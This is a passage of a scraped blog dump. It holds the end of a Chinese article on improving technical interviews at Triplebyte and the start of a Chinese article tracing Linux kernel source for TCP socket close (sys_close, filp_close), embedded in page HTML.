均值聚类（建立在彼此之上的多个操作）可能要比找到直方图中的最大矩形（leetcode 的一道算法题）要好得多。</p>\n<h3>4.避免问很难的问题</h3>\n<p>如果求职者很好地解决了一个很难的问题，那能极大地证明他的能力，但也正因为这个问题很难，所以大多数求职者都无力招架。你想要获得的信息量就很大程度上依赖于问题的难度，我们发现面试问题最合适的难度要明显比大多数面试官所想的简单得多。</p>\n<p>这一点影响更大，因为面试求职者时，获得的信息有两种来源：他们是否对一个问题给出了“正确的”答案、他们得出答案的过程/得出答案的容易程度。我们在 Triplebyte上收集了这方面的数据（同时给他们是否得出了正确答案和他们花费了多大努力这两项打分，然后衡量对公司而言哪个分数能更准确地对求职者能力进行预测）。我们发现这是一种权衡，对于更难的问题，求职者是否给出了正确的答案更能说明问题，相比之下，对于更简单的问题，求职者的答题过程和他们花费的努力程度则更有参考价值。考量了这两种信息来源后，面试问题最适宜的难度会往更加简单的方向偏移。</p>\n<p>我们现在遵循的经验法则是，面试官解决问题所用的时间应该是他们希望求职申请者们解决问题所花时间的25%。所以如果我在为时1小时的面试中提出了一个新的问题，我希望我的同事（没有提醒的情况下）能在15分钟内解答。外加之我们应问实际环境下的多面性问题，这意味着最佳的面试问题真的是相当直白和简单的。</p>\n<p>要澄清一点，我不是说要降低通过率的门槛。我支持问简单的问题，然后将他们回答的情况纳入考评范围；我支持问简单的问题，然后给予相当严苛的评判。这就是我们所找到的对面试环境进行优化的方式，这种方式额外产生的好处就是可以降低大部分求职者的面试压力。</p>\n<p>举例来说，让一个求职者创建一个简单的命令行接口，要求存储和检索键值对（如果做得好的话就再增添功能），可能要比让他们为算数表达式实现解析器要好得多；面试问题包含最普通的数据结构（表、哈希、还可能有树）可能要比涉及跳表、二叉排序树或其他更模糊的数据结构要好得多。</p>\n<h3>5 向每个求职申请者问相同的问题</h3>\n<p>面试就要对各个求职申请者进行比较，我们的目标就是将他们分为能为公司奉献光与热的和不能奉献的（在大家申请同一职位的情况下，选出申请人中最优秀的一个）。鉴于此，就没有理由向不同的求职申请者问不同的问题。如果你对申请同一职位的不同求职申请者采用不同的方式进行评判，那么你就引入了干扰因素。</p>\n<p>面试之所以一直都是当场选择问题，我觉得是因为面试官更喜欢这种方式。科技公司的工程师通常不喜欢面试别人，他们只是偶尔面试一下，面试会使他们偏离工作重点。为了将针对每个求职申请者的面试问题规范化，面试官们就需要花费更多的时间去学习如何制定面试问题，并且探讨面试打分、交接的方式。而且每次问题一发生变化，他们就需要重复以上过程。经常问同样的问题只是有些枯燥乏味而已。</p>\n<p>不幸的是，面试成功唯一的正解就是面试官需要花费心力。保证一致性是实现良好面试的关键所在，也就是说向每个求职申请者问相同的问题，并且要确保交接标准化，除此之外别无他法。</p>\n<h3>6.考虑实行多重的面试方法</h3>\n<p>与我之前的观点相悖，这里我们可以考虑提供几种截然不同的面试方法。筹备面试时，我们首先应该考虑想要招哪种类型的技术人才，但是我们想要的人才特质可能是相矛盾的，这一点很常见，例如想要招非常有数学天分的工程师，和一些高产/重复性强的工程师（甚至可能是针对同一职位）。在这种情况下，考虑采用多重的面试方法，其中关键在于你要很大程度上保证每种面试方法都是完全规范化的，我们在 Triplebyte上就在这样做。我们发现你仅需问每个求职申请者他们所青睐的面试方法即可。</p>\n<h3>7.不要因为资历而小看别人</h3>\n<p>资历不是没用的，毕业于麻省理工或者斯坦福的，抑或在谷歌和苹果公司工作过的工程师组建的队伍确实要比没这些资历的工程师更加优秀，但问题是绝大多数工程师（包括我自己）都没有以上资历，<strong>所以如果一个公司对此过分看重，那他们就会错失大多数编程大牛。</strong>在筛选环节将申请人的资历纳入考量范围并非毫无道理。我们在 Triplebyte 上没这么做（我们的考评是100%不看背景的），但是在筛选时对申请人的资历做一定的参考可能会有用。</p>\n<p>但是若让资历问题影响最终面试结果，那就没有道理了，数据表明这种情况确有发生。在我们不看背景进行考评的过程中，对于表现情况一定的求职申请者，那些简历上写有名校文凭的要在比没有名校文凭的人过关率高30%。如果面试官知道求职申请者手握麻省理工的文凭，那他们就更愿意原谅他们在面试环节暴露出来的一些瑕疵。</p>\n<p>这就是你应该避免的干扰，最显而易见的解决方式就是在开始面试前直接跳过申请者简历上的学校和公司名，有些求职申请者可能会提到他们的学校或公司，但是我们的面试都不看申请者的背景，而且在进行技术考评时，申请者自己提背景的情况也是相当少见的。</p>\n<h3>8.避免羞辱</h3>\n<p>面试失败的最丑恶的一种情况，就是招聘人员表现出一种羞辱的态度。他们不仅是对求职者技能进行考评的人，而且也代表即将要纳入成员的一个组或一支团队，在第二种身份下，面试是迎接新成员的重要仪式。面试确实让人有压力，很恐怖，但我们都会背负面试压力，所以求职者也自然会有压力，尤其在求职者表现不佳时，面试压力会更加凸显出来。当面试官看到求职者对着答案看上去那么显而易见的问题，就是答不出来急得砸脑袋时，就会觉得大失所望，气不打一处来，同时又万分沮丧，这样无疑会让求职者压力更大，形成恶性循环。</p>\n<p>一般这种情况面试官唯恐避之不及，为此应该展开探讨，并且对面试官进行培训。我们用的一个策略是，当求职者表现很差劲时，就将想要对其进行考评的评估模式切换成想要让其理解问题正解的教学模式。心理上的这种切换大有裨益，当你采用教学模式时，你就没有理由硬忍住不说答案了，也会变得完全亲和友善。</p>\n<h3>9.根据最高技能，而非平均或最低技能做录用决定</h3>\n<p>迄今为止，我只探讨过单独的问题，却没有谈过最终的面试决策。我的建议：在做录用决定时应看求职者（在你所关心的技能中）具备的最高水平技能，而非中等或最低水平技能。</p>\n<p>无论是有意还是无意，你们好像就是这么做的。每个面试过求职者的面试官通过聚在一起开会，来制定最终的录用/淘汰决定。在至少有一人力挺，且没有人强烈反对的情况下，求职申请者就会被录用。要想让一人力挺，求职申请者就需要主攻面试的其中一个部分，大显身手。我们的数据显示，要在公司面试的至少其中一个部分表现优异，求职者具备的最高技能就是最紧密的影响因素了。然而，为了得到 offer，求职者也需要保证没有强烈反对的声音，而若回答问题时表现得非常愚蠢，那么就不会引发强烈的反对。</p>\n<p>这里我们会发现大量的干扰，技术高明的工程师具备的能力各式各样，因而几乎不可能有求职者能驾驭所有技能。<strong><b>这就意味着如果你问了一个正确的（或错误的）问题，任何工程师都有可能出丑。</b></strong>那么求职者至少在一次面试中，体现了在一方面的优势（最高技能），且没有暴露在某些方面的明显劣势，才能获得 offer，而这里就有干扰出现。如同一个工程师在回答有关网络系统的面试问题时表现不好而遭到淘汰，但却在另一个面试中成绩优异，只因为面试没出网络系统的问题。</p>\n<p>我认为最好的解决方法就是让公司专注于求职者的最高技能，同时对于面试中部分环节表现不佳的人也能通融给过。<strong><b>这就是说，寻找充分的理由去录用，而不要因为求职申请者在某些技术领域能力薄弱的而过分担心。</b></strong>我不想表现得过于绝对，当然有些领域对公司是至关重要的。而且对于企业文化，若团队中每个人在特定的领域都有特定的定位，那很可能大有裨益，但是将更多的注意力集中于最高技能着实可以减少面试中的干扰。</p>\n<h2>到底为什么要搞面试？</h2>\n<p>我应该回答的最后一个问题是为什么要搞面试？我确信有些读者已经咬牙切齿地问“对一个破败的系统想那么多干嘛？直接用带回家的项目进行考评不就行了！或者直接采取试用呗！”毕竟，一些非常成功的企业都会进行试用（求职者在团队中待一周），或者用带回家的项目取代当面面试。试用是很有意义的，几乎可以肯定的是，让他们花一周的时间跟在一个工程师旁边工作（或者看他们是如何完成一个实际的项目的），要比让他们回答1小时的面试问题更能反映能力。然而，有两个问题导致试用一直无法取代标准面试：</p>\n<p>1.要进行试用的话，公司要承受高昂成本，没有公司能为每个求职申请者承担整整一周的试用花销。因而公司必须采用其他的面试环节来决定试用的人选。</p>\n<p>2.试用（以及大型的带回家完成的项目）对求职者而言成本高昂，即使他们能获得报酬，那也未必有空参与。比如一个工程师的工作是全职的，就可能没法抽空干别的，而且就算能抽出时间，可能也不愿意。而且如果一个工程师已经获得了一些offer，那就不太可能再甘愿承受结果还充满不确定性的试用考验了，这一现象明显能从 Tripletype 上的求职者中看到。许多最优秀的求职申请者（拥有其他公司的offer）只是单纯不做大型项目或者不经受试用考验。</p>\n<p><strong><b>试用是一种选人的绝佳方式。</b></strong>我认为如果你有开展试用的经济实力，那么加上试用这种选人方式是很不错的。但要想让这取代技术面试，并不完全可行。</p>\n<p>了解工程师过去的开发经历也可以成为取代技术面试的一种方式。逻辑上来看，通过了解他们过去的开发情况，就可以推知他们未来是否可以将工作干得得心应手。遗憾的是，我们在 Triplebyte 上实行此方法时，收效甚微。表达能力（推销自己的能力）强的到头来要比技术能力强的人更有胜算，巧舌如簧的工程师对自己的职能夸夸其谈（将整个团队的功劳独吞），谦虚谨慎的工程师却对自己的成绩轻描淡写，这样的现象屡见不鲜。如果有充分的时间和大量的问题去刨根究底，就有可能弄清楚真实情况，但是我们发现，常规面试时间有限，谈论过去的开发经历通常并不能取代技术面试。虽然谈过去经历有助于破冰，拉近和求职申请者间的关系，能够对他们的兴趣有所了解，（而且能从中评判求职者的表达能力，还有可能看出他和企业的的文化契合度），但要想让这取代技术面试，并不完全可行。</p>\n<h2>编程面试的好处！</h2>\n<p>我想让这篇博客以更加乐观的角度作结，无论面试存在多大的问题，但采用这种方法其实也有颇多好处。</p>\n<p>面试是对申请者能力的直接评估，我有一些朋友是当老师的，他们告诉我教师面试基本上考察的是语言表达能力（推销自己的能力）和所具备的文凭资历，这一点似乎从很多职业中都能得到印证。硅谷没有非常完美的精英体制，但我们至少确实在设法对申请者应具备的重要能力进行直接衡量，并且秉持达观开放的思想，认为一个人无论背景如何，只要具备相应的能力，就能够成为非常优秀的工程师。对文凭资历的偏见会成为贯彻这种思想的阻力，但我们在 Triplebyte 上已经很大程度上克服了这种偏见，并帮助很多没有常规资历的人找到了很好的技术工作。我认为 Triplebyte 不太可能解决比如在法律层面的问题，因为社会对于求职者文凭资历实在是太重视了。</p>\n<p>程序员同时也在选择面试形式。尽管这个话题颇有争议（当然有程序员对此持异议），但我们提供了各式各样不同的考评形式，通过试验，我们发现绝大多数的程序员还是会挑选常规的面试形式，仅有一小部分人会对公司采用试用或带回家的项目进行考评的形式更感兴趣。无论怎样，我们这里要说的是编程面试，其他形式的考评都能作为很好的补充备选，但看起来不太可能取代面试成为考评工程师的主要形式。<strong>不确切地套用丘吉尔的一句话：“面试是最差的一种考评工程师的方式，但它是我们迄今为止所能找到的最好的一种方式。”</strong></p>\n<h2>结论</h2>\n<p>面试工作很难，无奈的是人类都是复杂的。从某种程度上来说，想要靠区区几小时的面试去评判一个人的能力，这是傻子才会干的事，因而我觉得保持谦逊的态度是至关重要的。任何面试在很多时候都注定会失败，只是因为人实在是太复杂了。</p>\n<p>但这并不是说着我们应该放弃，<strong><b>试着将面试过程不断优化要比什么都不做好得多。</b></strong>在 Triplebyte 上，面试就是我们的产品，我们集体讨论，想出考评测试方法，进而随着时间的推移不断优化面试方式。我在这篇博客中分享了过去两年多学到的一些重点，期待反馈，想知道这些观点是否能够让大家受益。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114168\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114168votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114168\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11\">dimple11</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/09/28db3e36f17643a752be4b798d5ceabc.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/dimple11\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/dimple11/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 15</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/eab8e43cab7042122aaedf074f24e0e4a29fce44.jpg"}
{"title": "从 Linux 源码看 socket 的 close", "url": "http://blog.jobbole.com/114276/", "create_date": "2018/08/16", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "url_object_id": "55f5db66a79f044fb9cda220f73cbb30", "praise_nums": 1, "fav_nums": 2, "comment_nums": 1, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://my.oschina.net/alchemystar/blog/1821680\">无毁的湖光-Al</a>   </div><h1>从linux源码看socket的close</h1>\n<p>笔者一直觉得如果能知道从应用到框架再到操作系统的每一处代码，是一件Exciting的事情。上篇博客讲了socket的阻塞和非阻塞，这篇就开始谈一谈socket的close(以tcp为例且基于linux-2.6.24内核版本)</p>\n<h2>TCP关闭状态转移图:</h2>\n<p>众所周知，TCP的close过程是四次挥手，状态机的变迁也逃不出TCP状态转移图，如下图所示: <img title=\"在这里输入图片标题\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/bdc75920e097181288bc1dd4cf242f7c.png\" alt=\"输入图片说明\"><br>\ntcp的关闭主要分主动关闭、被动关闭以及同时关闭(特殊情况,不做描述)</p>\n<h2>主动关闭</h2>\n<h3>close(fd)的过程</h3>\n<p>以C语言为例，在我们关闭socket的时候，会使用close(fd)函数:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f913742706995\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nint    socket_fd;\r\nsocket_fd = socket(AF_INET, SOCK_STREAM, 0);\r\n...\r\n// 此处通过文件描述符关闭对应的socket\r\nclose(socket_fd)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f913742706995-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f913742706995-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f913742706995-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f913742706995-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f913742706995-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f913742706995-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f913742706995-1\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\">    </span><span class=\"crayon-v\">socket_fd</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f913742706995-2\"><span class=\"crayon-v\">socket_fd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">socket</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">AF_INET</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">SOCK_STREAM</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f913742706995-3\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f913742706995-4\"><span class=\"crayon-c\">// 此处通过文件描述符关闭对应的socket</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f913742706995-5\"><span class=\"crayon-e\">close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">socket_fd</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f913742706995-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>而close(int fd)又是通过系统调用sys_close来执行的:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f92c540027744\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nasmlinkage long sys_close(unsigned int fd)\r\n{\r\n\t// 清除(close_on_exec即退出进程时）的位图标记\r\n\tFD_CLR(fd, fdt-&gt;close_on_exec);\r\n\t// 释放文件描述符\r\n\t// 将fdt-&gt;open_fds即打开的fd位图中对应的位清除\r\n\t// 再将fd挂入下一个可使用的fd以便复用\r\n\t__put_unused_fd(files, fd);\r\n\t// 调用file_pointer的close方法真正清除\r\n\tretval = filp_close(filp, files);\r\n}\r\n\t\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f92c540027744-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f92c540027744-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f92c540027744-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f92c540027744-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f92c540027744-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f92c540027744-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f92c540027744-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f92c540027744-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f92c540027744-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f92c540027744-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f92c540027744-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f92c540027744-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f92c540027744-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f92c540027744-1\"><span class=\"crayon-e\">asmlinkage </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sys_close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fd</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f92c540027744-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f92c540027744-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 清除(close_on_exec即退出进程时）的位图标记</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f92c540027744-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">FD_CLR</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fd</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fdt</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">close_on_exec</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f92c540027744-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 释放文件描述符</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f92c540027744-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 将fdt-&gt;open_fds即打开的fd位图中对应的位清除</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f92c540027744-7\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 再将fd挂入下一个可使用的fd以便复用</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f92c540027744-8\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">__put_unused_fd</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">files</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fd</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f92c540027744-9\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">// 调用file_pointer的close方法真正清除</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f92c540027744-10\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">retval</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">filp_close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">filp</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">files</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f92c540027744-11\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f92c540027744-12\"><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f92c540027744-13\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>我们看到最终是调用的filp_close方法:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f931868474179\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nint filp_close(struct file *filp, fl_owner_t id)\r\n{\r\n\t// 如果存在flush方法则flush\r\n\tif (filp-&gt;f_op &amp;&amp; filp-&gt;f_op-&gt;flush)\r\n\t\tfilp-&gt;f_op-&gt;flush(filp, id);\r\n\t// 调用fput\t\r\n\tfput(filp);\r\n\t......\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f931868474179-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f931868474179-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f931868474179-3\">3</div><div class=\"crayon-num crayon-striped-num\" 